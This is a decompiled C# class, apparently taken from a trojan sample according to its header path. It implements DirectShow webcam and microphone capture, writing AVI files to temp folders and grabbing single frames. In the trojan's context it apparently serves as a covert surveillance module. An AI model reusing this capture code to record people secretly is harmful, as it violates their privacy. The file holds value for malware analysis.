// Decompiled with JetBrains decompiler
// Type: DirectX.Capture.Capture
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.KillAV.ao-937fd99ab6df975f8ace26b4ce6ead21ae41a82f170fbe18646720cacc517e69.exe

using DShowNET;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace DirectX.Capture
{
  public class Capture : Form, ISampleGrabberCB
  {
    private const int WM_GRAPHNOTIFY = 32769;
    protected DirectX.Capture.Capture.GraphState graphState = DirectX.Capture.Capture.GraphState.Null;
    protected bool isPreviewRendered = false;
    protected bool isCaptureRendered = false;
    protected bool wantPreviewRendered = false;
    protected bool wantCaptureRendered = false;
    protected bool wantCaptureFrame = false;
    protected int rotCookie = 0;
    protected Filter videoDevice = (Filter) null;
    protected Filter audioDevice = (Filter) null;
    protected Filter videoCompressor = (Filter) null;
    protected Filter audioCompressor = (Filter) null;
    protected string filename = "";
    protected Control previewWindow = (Control) null;
    protected VideoCapabilities videoCaps = (VideoCapabilities) null;
    protected AudioCapabilities audioCaps = (AudioCapabilities) null;
    protected SourceCollection videoSources = (SourceCollection) null;
    protected SourceCollection audioSources = (SourceCollection) null;
    protected PropertyPageCollection propertyPages = (PropertyPageCollection) null;
    protected Tuner tuner = (Tuner) null;
    protected IGraphBuilder graphBuilder;
    protected IMediaControl mediaControl;
    protected IVideoWindow videoWindow;
    protected ICaptureGraphBuilder2 captureGraphBuilder = (ICaptureGraphBuilder2) null;
    protected ISampleGrabber sampGrabber = (ISampleGrabber) null;
    protected IAMStreamConfig videoStreamConfig = (IAMStreamConfig) null;
    protected IAMStreamConfig audioStreamConfig = (IAMStreamConfig) null;
    protected IBaseFilter videoDeviceFilter = (IBaseFilter) null;
    protected IBaseFilter videoCompressorFilter = (IBaseFilter) null;
    protected IBaseFilter audioDeviceFilter = (IBaseFilter) null;
    protected IBaseFilter audioCompressorFilter = (IBaseFilter) null;
    protected IBaseFilter muxFilter = (IBaseFilter) null;
    protected IBaseFilter baseGrabFlt = (IBaseFilter) null;
    protected IFileSinkFilter fileWriterFilter = (IFileSinkFilter) null;
    protected VideoInfoHeader videoInfoHeader;
    protected byte[] savedArray;
    protected bool capturedFrame = false;
    protected int bufferedSize;
    protected bool captured = true;
    protected bool firstFrame = true;
    protected bool renderStream = false;
    private IMediaEventEx mediaEvt;
    public PictureBox ImageCaptured;

    public bool Capturing => this.graphState == DirectX.Capture.Capture.GraphState.Capturing;

    public bool Cued => this.isCaptureRendered && this.graphState == DirectX.Capture.Capture.GraphState.Rendered;

    public bool Stopped => this.graphState != DirectX.Capture.Capture.GraphState.Capturing;

    public string Filename
    {
      get => this.filename;
      set
      {
        this.assertStopped();
        this.filename = value;
        if (this.fileWriterFilter == null)
          return;
        AMMediaType pmt = new AMMediaType();
        int curFile = this.fileWriterFilter.GetCurFile(out string _, pmt);
        if (curFile < 0)
          Marshal.ThrowExceptionForHR(curFile);
        if (pmt.formatSize > 0)
          Marshal.FreeCoTaskMem(pmt.formatPtr);
        int errorCode = this.fileWriterFilter.SetFileName(this.filename, pmt);
        if (errorCode < 0)
          Marshal.ThrowExceptionForHR(errorCode);
      }
    }

    public Control PreviewWindow
    {
      get => this.previewWindow;
      set
      {
        this.assertStopped();
        this.derenderGraph();
        this.previewWindow = value;
        this.wantPreviewRendered = this.previewWindow != null && this.videoDevice != null;
        this.renderStream = false;
        this.renderGraph();
        this.startPreviewIfNeeded();
      }
    }

    public VideoCapabilities VideoCaps
    {
      get
      {
        if (this.videoCaps == null)
        {
          if (this.videoStreamConfig != null)
          {
            try
            {
              this.videoCaps = new VideoCapabilities(this.videoStreamConfig);
            }
            catch (Exception ex)
            {
            }
          }
        }
        return this.videoCaps;
      }
    }

    public AudioCapabilities AudioCaps
    {
      get
      {
        if (this.audioCaps == null)
        {
          if (this.audioStreamConfig != null)
          {
            try
            {
              this.audioCaps = new AudioCapabilities(this.audioStreamConfig);
            }
            catch (Exception ex)
            {
            }
          }
        }
        return this.audioCaps;
      }
    }

    public Filter VideoDevice => this.videoDevice;

    public Filter AudioDevice => this.audioDevice;

    public Filter VideoCompressor
    {
      get => this.videoCompressor;
      set
      {
        this.assertStopped();
        this.destroyGraph();
        this.videoCompressor = value;
        this.renderGraph();
        this.startPreviewIfNeeded();
      }
    }

    public Filter AudioCompressor
    {
      get => this.audioCompressor;
      set
      {
        this.assertStopped();
        this.destroyGraph();
        this.audioCompressor = value;
        this.renderGraph();
        this.startPreviewIfNeeded();
      }
    }

    public Source VideoSource
    {
      get => this.VideoSources.CurrentSource;
      set => this.VideoSources.CurrentSource = value;
    }

    public Source AudioSource
    {
      get => this.AudioSources.CurrentSource;
      set => this.AudioSources.CurrentSource = value;
    }

    public SourceCollection VideoSources
    {
      get
      {
        if (this.videoSources == null)
        {
          try
          {
            this.videoSources = this.videoDevice == null ? new SourceCollection() : new SourceCollection(this.captureGraphBuilder, this.videoDeviceFilter, true);
          }
          catch (Exception ex)
          {
          }
        }
        return this.videoSources;
      }
    }

    public SourceCollection AudioSources
    {
      get
      {
        if (this.audioSources == null)
        {
          try
          {
            this.audioSources = this.audioDevice == null ? new SourceCollection() : new SourceCollection(this.captureGraphBuilder, this.audioDeviceFilter, false);
          }
          catch (Exception ex)
          {
          }
        }
        return this.audioSources;
      }
    }

    public PropertyPageCollection PropertyPages
    {
      get
      {
        if (this.propertyPages == null)
        {
          try
          {
            this.propertyPages = new PropertyPageCollection(this.captureGraphBuilder, this.videoDeviceFilter, this.audioDeviceFilter, this.videoCompressorFilter, this.audioCompressorFilter, this.VideoSources, this.AudioSources);
          }
          catch (Exception ex)
          {
          }
        }
        return this.propertyPages;
      }
    }

    public Tuner Tuner => this.tuner;

    public double FrameRate
    {
      get => 10000000.0 / (double) (long) this.getStreamConfigSetting(this.videoStreamConfig, "AvgTimePerFrame");
      set => this.setStreamConfigSetting(this.videoStreamConfig, "AvgTimePerFrame", (object) (long) (10000000.0 / value));
    }

    public Size FrameSize
    {
      get
      {
        BitmapInfoHeader streamConfigSetting = (BitmapInfoHeader) this.getStreamConfigSetting(this.videoStreamConfig, "BmiHeader");
        return new Size(streamConfigSetting.Width, streamConfigSetting.Height);
      }
      set => this.setStreamConfigSetting(this.videoStreamConfig, "BmiHeader", (object) ((BitmapInfoHeader) this.getStreamConfigSetting(this.videoStreamConfig, "BmiHeader") with
      {
        Width = value.Width,
        Height = value.Height
      }));
    }

    public short AudioChannels
    {
      get => (short) this.getStreamConfigSetting(this.audioStreamConfig, "nChannels");
      set => this.setStreamConfigSetting(this.audioStreamConfig, "nChannels", (object) value);
    }

    public int AudioSamplingRate
    {
      get => (int) this.getStreamConfigSetting(this.audioStreamConfig, "nSamplesPerSec");
      set => this.setStreamConfigSetting(this.audioStreamConfig, "nSamplesPerSec", (object) value);
    }

    public short AudioSampleSize
    {
      get => (short) this.getStreamConfigSetting(this.audioStreamConfig, "wBitsPerSample");
      set => this.setStreamConfigSetting(this.audioStreamConfig, "wBitsPerSample", (object) value);
    }

    public event EventHandler CaptureComplete;

    public event DirectX.Capture.Capture.FrameCapHandler FrameCaptureComplete;

    public Capture(Filter videoDevice, Filter audioDevice)
    {
      this.videoDevice = videoDevice;
      this.audioDevice = audioDevice;
      this.Filename = this.getTempFilename();
      this.ImageCaptured = new PictureBox();
      this.createGraph();
    }

    ~Capture() => this.Dispose();

    public void Cue()
    {
      this.assertStopped();
      this.wantCaptureRendered = true;
      this.renderGraph();
      int errorCode = this.mediaControl.Pause();
      if (errorCode == 0)
        return;
      Marshal.ThrowExceptionForHR(errorCode);
    }

    public void Start()
    {
      this.Stop();
      this.firstFrame = false;
      this.assertStopped();
      this.wantCaptureRendered = true;
      this.renderStream = true;
      this.renderGraph();
      int errorCode = this.mediaControl.Run();
      if (errorCode != 0)
        Marshal.ThrowExceptionForHR(errorCode);
      this.graphState = DirectX.Capture.Capture.GraphState.Capturing;
    }

    public void Stop()
    {
      if (this.mediaControl != null)
        this.mediaControl.Stop();
      this.wantCaptureRendered = false;
      this.wantPreviewRendered = true;
      if (this.graphState == DirectX.Capture.Capture.GraphState.Capturing)
      {
        this.graphState = DirectX.Capture.Capture.GraphState.Rendered;
        if (this.CaptureComplete != null)
          this.CaptureComplete((object) this, (EventArgs) null);
      }
      this.firstFrame = true;
      this.renderStream = false;
      try
      {
        this.renderGraph();
      }
      catch
      {
      }
      try
      {
        this.startPreviewIfNeeded();
      }
      catch
      {
      }
    }

    public void DisposeCapture()
    {
      this.wantPreviewRendered = false;
      this.wantCaptureRendered = false;
      this.CaptureComplete = (EventHandler) null;
      try
      {
        this.destroyGraph();
      }
      catch
      {
      }
      if (this.videoSources != null)
        this.videoSources.Dispose();
      this.videoSources = (SourceCollection) null;
      if (this.audioSources != null)
        this.audioSources.Dispose();
      this.audioSources = (SourceCollection) null;
    }

    [STAThread]
    public void CaptureFrame()
    {
      int num;
      if (this.firstFrame)
      {
        this.assertStopped();
        this.renderStream = true;
        this.renderGraph();
        num = this.mediaControl.Run();
        this.firstFrame = false;
      }
      this.captured = false;
      if (this.savedArray == null)
      {
        int imageSize = this.videoInfoHeader.BmiHeader.ImageSize;
        if (imageSize < 1000 || imageSize > 16000000)
          return;
        this.savedArray = new byte[imageSize + 64000];
      }
      num = this.sampGrabber.SetCallback((ISampleGrabberCB) this, 1);
    }

    public void RenderPreview()
    {
      this.assertStopped();
      this.renderStream = true;
      this.renderGraph();
      this.mediaControl.Run();
    }

    protected void createGraph()
    {
      object obj = (object) null;
      if (this.graphState >= DirectX.Capture.Capture.GraphState.Created)
        return;
      GC.Collect();
      this.graphBuilder = (IGraphBuilder) Activator.CreateInstance(System.Type.GetTypeFromCLSID(Clsid.FilterGraph, true));
      Guid captureGraphBuilder2 = Clsid.CaptureGraphBuilder2;
      Guid guid1 = typeof (ICaptureGraphBuilder2).GUID;
      this.captureGraphBuilder = (ICaptureGraphBuilder2) DsBugWO.CreateDsInstance(ref captureGraphBuilder2, ref guid1);
      this.sampGrabber = (ISampleGrabber) Activator.CreateInstance(System.Type.GetTypeFromCLSID(Clsid.SampleGrabber, true));
      obj = (object) null;
      int errorCode1 = this.captureGraphBuilder.SetFiltergraph(this.graphBuilder);
      if (errorCode1 < 0)
        Marshal.ThrowExceptionForHR(errorCode1);
      int errorCode2 = this.sampGrabber.SetMediaType(new AMMediaType()
      {
        majorType = MediaType.Video,
        subType = MediaSubType.RGB24,
        formatType = FormatType.VideoInfo
      });
      if (errorCode2 < 0)
        Marshal.ThrowExceptionForHR(errorCode2);
      if (this.VideoDevice != null)
      {
        this.videoDeviceFilter = (IBaseFilter) Marshal.BindToMoniker(this.VideoDevice.MonikerString);
        int errorCode3 = this.graphBuilder.AddFilter(this.videoDeviceFilter, "Video Capture Device");
        if (errorCode3 < 0)
          Marshal.ThrowExceptionForHR(errorCode3);
        this.mediaEvt = (IMediaEventEx) this.graphBuilder;
        this.baseGrabFlt = (IBaseFilter) this.sampGrabber;
        int errorCode4 = this.graphBuilder.AddFilter(this.baseGrabFlt, "DS.NET Grabber");
        if (errorCode4 < 0)
          Marshal.ThrowExceptionForHR(errorCode4);
      }
      if (this.AudioDevice != null)
      {
        this.audioDeviceFilter = (IBaseFilter) Marshal.BindToMoniker(this.AudioDevice.MonikerString);
        int errorCode5 = this.graphBuilder.AddFilter(this.audioDeviceFilter, "Audio Capture Device");
        if (errorCode5 < 0)
          Marshal.ThrowExceptionForHR(errorCode5);
      }
      if (this.VideoCompressor != null)
      {
        this.videoCompressorFilter = (IBaseFilter) Marshal.BindToMoniker(this.VideoCompressor.MonikerString);
        int errorCode6 = this.graphBuilder.AddFilter(this.videoCompressorFilter, "Video Compressor");
        if (errorCode6 < 0)
          Marshal.ThrowExceptionForHR(errorCode6);
      }
      if (this.AudioCompressor != null)
      {
        this.audioCompressorFilter = (IBaseFilter) Marshal.BindToMoniker(this.AudioCompressor.MonikerString);
        int errorCode7 = this.graphBuilder.AddFilter(this.audioCompressorFilter, "Audio Compressor");
        if (errorCode7 < 0)
          Marshal.ThrowExceptionForHR(errorCode7);
      }
      Guid capture1 = PinCategory.Capture;
      Guid pType = MediaType.Interleaved;
      Guid guid2 = typeof (IAMStreamConfig).GUID;
      object ppint;
      if (this.captureGraphBuilder.FindInterface(ref capture1, ref pType, this.videoDeviceFilter, ref guid2, out ppint) != 0)
      {
        pType = MediaType.Video;
        if (this.captureGraphBuilder.FindInterface(ref capture1, ref pType, this.videoDeviceFilter, ref guid2, out ppint) != 0)
          ppint = (object) null;
      }
      this.videoStreamConfig = ppint as IAMStreamConfig;
      ppint = (object) null;
      Guid capture2 = PinCategory.Capture;
      pType = MediaType.Audio;
      guid2 = typeof (IAMStreamConfig).GUID;
      if (this.captureGraphBuilder.FindInterface(ref capture2, ref pType, this.audioDeviceFilter, ref guid2, out ppint) != 0)
        ppint = (object) null;
      this.audioStreamConfig = ppint as IAMStreamConfig;
      this.mediaControl = (IMediaControl) this.graphBuilder;
      if (this.videoSources != null)
        this.videoSources.Dispose();
      this.videoSources = (SourceCollection) null;
      if (this.audioSources != null)
        this.audioSources.Dispose();
      this.audioSources = (SourceCollection) null;
      if (this.propertyPages != null)
        this.propertyPages.Dispose();
      this.propertyPages = (PropertyPageCollection) null;
      this.videoCaps = (VideoCapabilities) null;
      this.audioCaps = (AudioCapabilities) null;
      ppint = (object) null;
      capture2 = PinCategory.Capture;
      pType = MediaType.Interleaved;
      guid2 = typeof (IAMTVTuner).GUID;
      if (this.captureGraphBuilder.FindInterface(ref capture2, ref pType, this.videoDeviceFilter, ref guid2, out ppint) != 0)
      {
        pType = MediaType.Video;
        if (this.captureGraphBuilder.FindInterface(ref capture2, ref pType, this.videoDeviceFilter, ref guid2, out ppint) != 0)
          ppint = (object) null;
      }
      if (ppint is IAMTVTuner tuner)
        this.tuner = new Tuner(tuner);
      this.graphState = DirectX.Capture.Capture.GraphState.Created;
    }

    protected void renderGraph()
    {
      bool flag = false;
      this.assertStopped();
      if (this.mediaControl != null)
        this.mediaControl.Stop();
      this.createGraph();
      if (!this.wantPreviewRendered && this.isPreviewRendered)
        this.derenderGraph();
      if (!this.wantCaptureRendered && this.isCaptureRendered && this.wantPreviewRendered)
      {
        this.derenderGraph();
        this.graphState = DirectX.Capture.Capture.GraphState.Null;
        this.createGraph();
      }
      int num1;
      Guid pCategory;
      if (this.wantCaptureRendered && !this.isCaptureRendered)
      {
        Guid avi = MediaSubType.Avi;
        num1 = this.captureGraphBuilder.SetOutputFileName(ref avi, this.Filename, out this.muxFilter, out this.fileWriterFilter);
        if (this.VideoDevice != null)
        {
          pCategory = PinCategory.Capture;
          Guid interleaved = MediaType.Interleaved;
          if (this.captureGraphBuilder.RenderStream(ref pCategory, ref interleaved, (object) this.videoDeviceFilter, this.videoCompressorFilter, this.muxFilter) < 0)
          {
            Guid video = MediaType.Video;
            num1 = this.captureGraphBuilder.RenderStream(ref pCategory, ref video, (object) this.videoDeviceFilter, this.videoCompressorFilter, this.muxFilter);
          }
        }
        if (this.AudioDevice != null)
        {
          pCategory = PinCategory.Capture;
          Guid audio = MediaType.Audio;
          num1 = this.captureGraphBuilder.RenderStream(ref pCategory, ref audio, (object) this.audioDeviceFilter, this.audioCompressorFilter, this.muxFilter);
        }
        this.isCaptureRendered = true;
        flag = true;
      }
      if (this.wantPreviewRendered && this.renderStream && !this.isPreviewRendered)
      {
        pCategory = PinCategory.Preview;
        Guid video = MediaType.Video;
        num1 = this.captureGraphBuilder.RenderStream(ref pCategory, ref video, (object) this.videoDeviceFilter, this.baseGrabFlt, (IBaseFilter) null);
        this.videoWindow = (IVideoWindow) this.graphBuilder;
        num1 = this.videoWindow.put_Owner(this.previewWindow.Handle);
        num1 = this.videoWindow.put_WindowStyle(1174405120);
        this.previewWindow.Resize += new EventHandler(this.onPreviewWindowResize);
        this.onPreviewWindowResize((object) this, (EventArgs) null);
        num1 = this.videoWindow.put_Visible(-1);
        num1 = this.mediaEvt.SetNotifyWindow(this.Handle, 32769, IntPtr.Zero);
        this.isPreviewRendered = true;
        flag = true;
        AMMediaType pmt = new AMMediaType();
        num1 = this.sampGrabber.GetConnectedMediaType(pmt);
        this.videoInfoHeader = (VideoInfoHeader) Marshal.PtrToStructure(pmt.formatPtr, typeof (VideoInfoHeader));
        Marshal.FreeCoTaskMem(pmt.formatPtr);
        pmt.formatPtr = IntPtr.Zero;
        int num2 = this.sampGrabber.SetBufferSamples(false);
        if (num2 == 0)
          num2 = this.sampGrabber.SetOneShot(false);
        if (num2 == 0)
          num2 = this.sampGrabber.SetCallback((ISampleGrabberCB) null, 0);
        if (num2 < 0)
          num1 = 0;
      }
      if (!flag)
        return;
      this.graphState = DirectX.Capture.Capture.GraphState.Rendered;
    }

    protected void startPreviewIfNeeded()
    {
      if (!this.wantPreviewRendered || !this.isPreviewRendered || this.isCaptureRendered)
        return;
      this.mediaControl.Run();
    }

    protected void derenderGraph()
    {
      if (this.mediaControl != null)
        this.mediaControl.Stop();
      if (this.videoWindow != null)
      {
        this.videoWindow.put_Visible(0);
        this.videoWindow.put_Owner(IntPtr.Zero);
        this.videoWindow = (IVideoWindow) null;
      }
      if (this.PreviewWindow != null)
        this.previewWindow.Resize -= new EventHandler(this.onPreviewWindowResize);
      if (this.graphState < DirectX.Capture.Capture.GraphState.Rendered)
        return;
      this.graphState = DirectX.Capture.Capture.GraphState.Created;
      this.isCaptureRendered = false;
      this.isPreviewRendered = false;
      if (this.videoDeviceFilter != null)
        this.removeDownstream(this.videoDeviceFilter, this.videoCompressor == null);
      if (this.audioDeviceFilter != null)
        this.removeDownstream(this.audioDeviceFilter, this.audioCompressor == null);
      this.muxFilter = (IBaseFilter) null;
      this.fileWriterFilter = (IFileSinkFilter) null;
      this.baseGrabFlt = (IBaseFilter) null;
    }

    protected void removeDownstream(IBaseFilter filter, bool removeFirstFilter)
    {
      IEnumPins ppEnum;
      int num1 = filter.EnumPins(out ppEnum);
      ppEnum.Reset();
      if (num1 != 0 || ppEnum == null)
        return;
      IPin[] ppPins = new IPin[1];
      int num2;
      do
      {
        num2 = ppEnum.Next(1, ppPins, out int _);
        if (num2 == 0 && ppPins[0] != null)
        {
          IPin ppPin = (IPin) null;
          ppPins[0].ConnectedTo(out ppPin);
          if (ppPin != null)
          {
            PinInfo pInfo = new PinInfo();
            num2 = ppPin.QueryPinInfo(out pInfo);
            if (num2 == 0 && pInfo.dir == PinDirection.Input)
            {
              this.removeDownstream(pInfo.filter, true);
              this.graphBuilder.Disconnect(ppPin);
              this.graphBuilder.Disconnect(ppPins[0]);
              if (pInfo.filter != this.videoCompressorFilter && pInfo.filter != this.audioCompressorFilter)
                this.graphBuilder.RemoveFilter(pInfo.filter);
            }
            Marshal.ReleaseComObject((object) pInfo.filter);
            Marshal.ReleaseComObject((object) ppPin);
          }
          Marshal.ReleaseComObject((object) ppPins[0]);
        }
      }
      while (num2 == 0);
      Marshal.ReleaseComObject((object) ppEnum);
    }

    protected void destroyGraph()
    {
      try
      {
        this.derenderGraph();
      }
      catch
      {
      }
      this.graphState = DirectX.Capture.Capture.GraphState.Null;
      this.isCaptureRendered = false;
      this.isPreviewRendered = false;
      if (this.rotCookie != 0)
      {
        DsROT.RemoveGraphFromRot(ref this.rotCookie);
        this.rotCookie = 0;
      }
      if (this.muxFilter != null)
        this.graphBuilder.RemoveFilter(this.muxFilter);
      if (this.baseGrabFlt != null)
        this.graphBuilder.RemoveFilter(this.baseGrabFlt);
      if (this.videoCompressorFilter != null)
        this.graphBuilder.RemoveFilter(this.videoCompressorFilter);
      if (this.audioCompressorFilter != null)
        this.graphBuilder.RemoveFilter(this.audioCompressorFilter);
      if (this.videoDeviceFilter != null)
        this.graphBuilder.RemoveFilter(this.videoDeviceFilter);
      if (this.audioDeviceFilter != null)
        this.graphBuilder.RemoveFilter(this.audioDeviceFilter);
      if (this.videoSources != null)
        this.videoSources.Dispose();
      this.videoSources = (SourceCollection) null;
      if (this.audioSources != null)
        this.audioSources.Dispose();
      this.audioSources = (SourceCollection) null;
      if (this.propertyPages != null)
        this.propertyPages.Dispose();
      this.propertyPages = (PropertyPageCollection) null;
      if (this.tuner != null)
        this.tuner.Dispose();
      this.tuner = (Tuner) null;
      if (this.graphBuilder != null)
        Marshal.ReleaseComObject((object) this.graphBuilder);
      this.graphBuilder = (IGraphBuilder) null;
      if (this.captureGraphBuilder != null)
        Marshal.ReleaseComObject((object) this.captureGraphBuilder);
      this.captureGraphBuilder = (ICaptureGraphBuilder2) null;
      if (this.muxFilter != null)
        Marshal.ReleaseComObject((object) this.muxFilter);
      this.muxFilter = (IBaseFilter) null;
      if (this.baseGrabFlt != null)
        Marshal.ReleaseComObject((object) this.baseGrabFlt);
      this.baseGrabFlt = (IBaseFilter) null;
      if (this.fileWriterFilter != null)
        Marshal.ReleaseComObject((object) this.fileWriterFilter);
      this.fileWriterFilter = (IFileSinkFilter) null;
      if (this.videoDeviceFilter != null)
        Marshal.ReleaseComObject((object) this.videoDeviceFilter);
      this.videoDeviceFilter = (IBaseFilter) null;
      if (this.audioDeviceFilter != null)
        Marshal.ReleaseComObject((object) this.audioDeviceFilter);
      this.audioDeviceFilter = (IBaseFilter) null;
      if (this.videoCompressorFilter != null)
        Marshal.ReleaseComObject((object) this.videoCompressorFilter);
      this.videoCompressorFilter = (IBaseFilter) null;
      if (this.audioCompressorFilter != null)
        Marshal.ReleaseComObject((object) this.audioCompressorFilter);
      this.audioCompressorFilter = (IBaseFilter) null;
      this.mediaControl = (IMediaControl) null;
      this.videoWindow = (IVideoWindow) null;
      GC.Collect();
    }

    protected void onPreviewWindowResize(object sender, EventArgs e)
    {
      if (this.videoWindow == null)
        return;
      Rectangle clientRectangle = this.previewWindow.ClientRectangle;
      this.videoWindow.SetWindowPosition(0, 0, clientRectangle.Right, clientRectangle.Bottom);
    }

    protected string getTempFilename()
    {
      string path;
      try
      {
        int num1 = 0;
        Random random = new Random();
        string tempPath = Path.GetTempPath();
        do
        {
          int num2 = random.Next();
          path = Path.Combine(tempPath, num2.ToString("X") + ".avi");
          ++num1;
        }
        while (num1 <= 100 && File.Exists(path));
        return path;
      }
      catch
      {
        path = "c:\temp.avi";
      }
      return path;
    }

    protected object getStreamConfigSetting(IAMStreamConfig streamConfig, string fieldName)
    {
      if (streamConfig == null)
        throw new NotSupportedException();
      this.assertStopped();
      this.derenderGraph();
      object streamConfigSetting = (object) null;
      IntPtr pmt = IntPtr.Zero;
      AMMediaType amMediaType = new AMMediaType();
      try
      {
        streamConfig.GetFormat(out pmt);
        Marshal.PtrToStructure(pmt, (object) amMediaType);
        object structure = (object) null;
        if (amMediaType.formatType == FormatType.WaveEx)
          structure = (object) new WaveFormatEx();
        else if (amMediaType.formatType == FormatType.VideoInfo)
          structure = (object) new VideoInfoHeader();
        else if (amMediaType.formatType == FormatType.VideoInfo2)
          structure = (object) new VideoInfoHeader2();
        Marshal.PtrToStructure(amMediaType.formatPtr, structure);
        streamConfigSetting = structure.GetType().GetField(fieldName).GetValue(structure);
      }
      finally
      {
        DsUtils.FreeAMMediaType(amMediaType);
        Marshal.FreeCoTaskMem(pmt);
      }
      this.renderStream = false;
      this.renderGraph();
      this.startPreviewIfNeeded();
      return streamConfigSetting;
    }

    protected object setStreamConfigSetting(
      IAMStreamConfig streamConfig,
      string fieldName,
      object newValue)
    {
      if (streamConfig == null)
        throw new NotSupportedException();
      this.assertStopped();
      this.derenderGraph();
      object obj = (object) null;
      IntPtr pmt = IntPtr.Zero;
      AMMediaType amMediaType = new AMMediaType();
      try
      {
        int num = streamConfig.GetFormat(out pmt);
        Marshal.PtrToStructure(pmt, (object) amMediaType);
        object structure = (object) null;
        if (amMediaType.formatType == FormatType.WaveEx)
          structure = (object) new WaveFormatEx();
        else if (amMediaType.formatType == FormatType.VideoInfo)
          structure = (object) new VideoInfoHeader();
        else if (amMediaType.formatType == FormatType.VideoInfo2)
          structure = (object) new VideoInfoHeader2();
        Marshal.PtrToStructure(amMediaType.formatPtr, structure);
        FieldInfo field = structure.GetType().GetField(fieldName);
        if ((object) field == null)
          field.SetValue(structure, newValue);
        Marshal.StructureToPtr(structure, amMediaType.formatPtr, false);
        num = streamConfig.SetFormat(amMediaType);
      }
      finally
      {
        DsUtils.FreeAMMediaType(amMediaType);
        Marshal.FreeCoTaskMem(pmt);
      }
      this.renderStream = false;
      this.renderGraph();
      this.startPreviewIfNeeded();
      return obj;
    }

    protected void assertStopped()
    {
      if (this.Stopped)
        ;
    }

    private void OnCaptureDone()
    {
      if (this.sampGrabber == null)
        return;
      this.sampGrabber.SetCallback((ISampleGrabberCB) null, 0);
      int width = this.videoInfoHeader.BmiHeader.Width;
      int height = this.videoInfoHeader.BmiHeader.Height;
      if ((width & 3) != 0 || width < 32 || width > 4096 || height < 32 || height > 4096)
        return;
      int num = width * 3;
      GCHandle gcHandle = GCHandle.Alloc((object) this.savedArray, GCHandleType.Pinned);
      int scan0 = (int) gcHandle.AddrOfPinnedObject() + (height - 1) * num;
      Bitmap bitmap = new Bitmap(width, height, -num, PixelFormat.Format24bppRgb, (IntPtr) scan0);
      gcHandle.Free();
      this.savedArray = (byte[]) null;
      this.ImageCaptured.Image = (Image) bitmap;
      this.FrameCaptureComplete(this.ImageCaptured);
    }

    protected override void WndProc(ref Message m)
    {
      if (m.Msg == 32769)
      {
        if (this.mediaEvt == null)
          return;
        this.OnGraphNotify();
      }
      else
        base.WndProc(ref m);
    }

    private void OnGraphNotify()
    {
      DsEvCode lEventCode;
      int lParam1;
      int lParam2;
      do
        ;
      while (this.mediaEvt.GetEvent(out lEventCode, out lParam1, out lParam2, 0) >= 0 && this.mediaEvt.FreeEventParams(lEventCode, lParam1, lParam2) == 0);
    }

    int ISampleGrabberCB.SampleCB(double SampleTime, IMediaSample pSample) => 0;

    int ISampleGrabberCB.BufferCB(double SampleTime, IntPtr pBuffer, int BufferLen)
    {
      if (this.captured || this.savedArray == null)
        return 0;
      this.captured = true;
      this.bufferedSize = BufferLen;
      if (pBuffer != IntPtr.Zero && BufferLen > 1000 && BufferLen <= this.savedArray.Length)
        Marshal.Copy(pBuffer, this.savedArray, 0, BufferLen);
      try
      {
        this.BeginInvoke((Delegate) new DirectX.Capture.Capture.CaptureDone(this.OnCaptureDone));
      }
      catch (ThreadInterruptedException ex)
      {
      }
      catch (Exception ex)
      {
      }
      return 0;
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.ClientSize = new Size(284, 264);
      this.Name = nameof (Capture);
      this.Load += new EventHandler(this.Capture_Load);
      this.ResumeLayout(false);
    }

    private void Capture_Load(object sender, EventArgs e)
    {
    }

    protected enum GraphState
    {
      Null,
      Created,
      Rendered,
      Capturing,
    }

    public delegate void FrameCapHandler(PictureBox Frame);

    private delegate void CaptureDone();
  }
}
